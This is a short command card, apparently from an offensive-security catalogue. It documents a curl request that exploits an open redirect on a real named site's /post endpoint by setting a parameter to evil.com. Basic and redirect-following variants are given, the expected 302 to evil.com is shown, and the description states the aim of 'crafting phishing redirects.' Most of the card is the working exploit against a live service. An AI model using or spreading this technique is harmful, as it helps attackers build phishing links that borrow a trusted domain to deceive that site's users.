---
data: >-
  curl -i
  "https://secure.chaturbate.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
tags:
  - web
  - redirect
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.166Z'
id: 29d75b46-d551-405c-8638-d6f9452d8368
verified: false
validated: true
submitted: true
---
# curl-get-secure-chaturbate-post-redirect

## Command

```bash
curl -i "https://secure.chaturbate.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Description

Sends a GET request to secure.chaturbate.com /post to exploit the open redirect, similar to the securegatewayaccess variant, for verifying vulnerability and crafting phishing redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Show headers | Yes |
| `URL` | Endpoint with manipulated parameters | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://secure.chaturbate.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

### Advanced Usage (Follow)

```bash
curl -i -L "https://secure.chaturbate.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Expected Output

HTTP/1.1 302
Location: http://evil.com/?=/tipping/purchase_tokens/

Confirms redirect exploitation.

## Related

- [[Related Procedure: Exploit-Open-Redirect-on-secure-chaturbate-com-post]]
